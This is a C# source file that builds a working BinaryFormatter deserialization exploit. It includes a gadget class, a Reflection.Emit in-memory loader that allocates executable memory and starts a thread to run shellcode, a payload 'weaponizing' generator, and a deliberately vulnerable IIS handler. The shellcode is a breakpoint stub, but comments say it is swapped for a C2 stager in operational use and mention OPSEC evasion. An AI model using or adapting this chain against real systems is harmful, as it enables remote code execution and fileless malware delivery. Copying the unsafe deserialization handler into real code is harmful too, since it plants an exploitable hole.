using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web;

#pragma warning disable SYSLIB0011 // BinaryFormatter is obsolete but essential for legacy validation

namespace HighFidelityExploit
{
    /// <summary>
    /// Native API definitions used by the in-memory loader DLL.
    /// </summary>
    public static class Win32
    {
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
    }

    /// <summary>
    /// The Gadget: This object is serialized and sent to the target.
    /// Upon deserialization, BinaryFormatter calls GetRealObject, triggering our chain.
    /// </summary>
    [Serializable]
    public class DeserializationGadget : IObjectReference
    {
        public byte[] AssemblyBytes { get; set; }
        public byte[] Shellcode { get; set; }

        public object GetRealObject(StreamingContext context)
        {
            if (AssemblyBytes == null || Shellcode == null) return this;

            // OPSEC: Load the secondary DLL entirely in memory
            Assembly asm = Assembly.Load(AssemblyBytes);
            Type loaderType = asm.GetType("InMemoryLoader.ExecutionEngine");
            MethodInfo runMethod = loaderType.GetMethod("Execute", BindingFlags.Public | BindingFlags.Static);

            // Trigger the in-memory execution routine
            runMethod.Invoke(null, new object[] { Shellcode });

            return this;
        }
    }

    /// <summary>
    /// The Generator: Creates a weaponized payload without requiring external files or compilers.
    /// </summary>
    public static class PayloadGenerator
    {
        public static byte[] GenerateWeaponizedPayload()
        {
            byte[] loaderDll = CreateInMemoryLoaderAssembly();
            byte[] shellcode = GetMinimalShellcodeStub();

            var gadget = new DeserializationGadget
            {
                AssemblyBytes = loaderDll,
                Shellcode = shellcode
            };

            using (var ms = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(ms, gadget);
                return ms.ToArray();
            }
        }

        private static byte[] CreateInMemoryLoaderAssembly()
        {
            // Use Reflection.Emit to create a valid .NET assembly in memory
            AssemblyName asmName = new AssemblyName("InMemoryLoader");
            AssemblyBuilder ab = AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.RunAndCollect);
            ModuleBuilder mb = ab.DefineDynamicModule("MainModule");
            TypeBuilder tb = mb.DefineType("InMemoryLoader.ExecutionEngine", TypeAttributes.Public | TypeAttributes.Class);

            // Define: public static void Execute(byte[] shellcode)
            MethodBuilder method = tb.DefineMethod("Execute", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new[] { typeof(byte[]) });
            ILGenerator il = method.GetILGenerator();

            // Local variables
            LocalBuilder addr = il.DeclareLocal(typeof(IntPtr));
            LocalBuilder oldProt = il.DeclareLocal(typeof(uint));
            LocalBuilder tid = il.DeclareLocal(typeof(uint));

            // 1. VirtualAlloc(IntPtr.Zero, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
            il.Emit(OpCodes.Ldc_I4_0); // lpAddress
            il.Emit(OpCodes.Ldarg_0); 
            il.Emit(OpCodes.Ldlen); 
            il.Emit(OpCodes.Conv_U4); // dwSize
            il.Emit(OpCodes.Ldc_I4, (int)(Win32.MEM_COMMIT | Win32.MEM_RESERVE)); // flAllocationType
            il.Emit(OpCodes.Ldc_I4, (int)Win32.PAGE_READWRITE); // flProtect
            il.Emit(OpCodes.Call, typeof(Win32).GetMethod("VirtualAlloc"));
            il.Emit(OpCodes.Stloc, addr);

            // 2. Marshal.Copy(shellcode, 0, addr, size)
            il.Emit(OpCodes.Ldarg_0); // src
            il.Emit(OpCodes.Ldc_I4_0); // srcOffset
            il.Emit(OpCodes.Ldloc, addr); // dst
            il.Emit(OpCodes.Ldarg_0); 
            il.Emit(OpCodes.Ldlen); 
            il.Emit(OpCodes.Conv_I4); // length
            il.Emit(OpCodes.Call, typeof(Marshal).GetMethod("Copy", new[] { typeof(byte[]), typeof(int), typeof(IntPtr), typeof(int) }));

            // 3. VirtualProtect(addr, size, PAGE_EXECUTE_READ, out oldProt)
            il.Emit(OpCodes.Ldloc, addr); // lpAddress
            il.Emit(OpCodes.Ldarg_0); 
            il.Emit(OpCodes.Ldlen); 
            il.Emit(OpCodes.Conv_U4); // dwSize
            il.Emit(OpCodes.Ldc_I4, (int)Win32.PAGE_EXECUTE_READ); // flNewProtect
            il.Emit(OpCodes.Ldloca, oldProt); // lpflOldProtect
            il.Emit(OpCodes.Call, typeof(Win32).GetMethod("VirtualProtect"));

            // 4. CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid)
            il.Emit(OpCodes.Ldc_I4_0); // lpThreadAttributes
            il.Emit(OpCodes.Ldc_I4_0); // dwStackSize
            il.Emit(OpCodes.Ldloc, addr); // lpStartAddress
            il.Emit(OpCodes.Ldc_I4_0); // lpParameter
            il.Emit(OpCodes.Ldc_I4_0); // dwCreationFlags
            il.Emit(OpCodes.Ldloca, tid); // lpThreadId
            il.Emit(OpCodes.Call, typeof(Win32).GetMethod("CreateThread"));

            il.Emit(OpCodes.Ret);

            tb.CreateType();

            // Extract raw bytes of the emitted assembly for Assembly.Load(byte[])
            // This accesses the internal representation to ensure a valid PE is produced in memory
            Assembly generatedAsm = ab;
            FieldInfo rawField = typeof(Assembly).GetField("_rawAssembly", BindingFlags.NonPublic | BindingFlags.Instance);
            if (rawField != null)
            {
                return (byte[])rawField.GetValue(generatedAsm);
            }

            throw new Exception("Failed to extract raw assembly bytes for in-memory loading.");
        }

        private static byte[] GetMinimalShellcodeStub()
        {
            // x64 Minimal Shellcode: NOP Sled + INT3 (Breakpoint) 
            // In operational scenarios, this is replaced by the actual C2 agent/stager.
            return new byte[] { 0x90, 0x90, 0x90, 0x90, 0xCC };
        }
    }

    /// <summary>
    /// The Vulnerable Endpoint: Simulates an IIS worker process (w3wp.exe) receiving a request.
    /// </summary>
    public class VulnerableHttpHandler : IHttpHandler
    {
        public bool IsReusable => false;

        public void ProcessRequest(HttpContext context)
        {
            try
            {
                // Sink: BinaryFormatter deserializing user-controlled input from the request stream
                BinaryFormatter formatter = new BinaryFormatter();
                object result = formatter.Deserialize(context.Request.InputStream);
                
                context.Response.Write("State successfully synchronized.");
            }
            catch (Exception ex)
            {
                context.Response.StatusCode = 500;
                context.Response.Write($"Internal Error: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Validation harness to demonstrate the end-to-end exploit chain.
    /// </summary>
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("[*] Generating weaponized BinaryFormatter payload...");
            byte[] payload = PayloadGenerator.GenerateWeaponizedPayload();
            Console.WriteLine($"[+] Payload generated. Size: {payload.Length} bytes.");

            // Simulate the vulnerable endpoint receiving the binary stream
            Console.WriteLine("[*] Simulating delivery to VulnerableHttpHandler sink...");
            using (var ms = new MemoryStream(payload))
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Deserialize(ms); 
            }

            Console.WriteLine("[+] Execution triggered in current process context.");
        }
    }
}
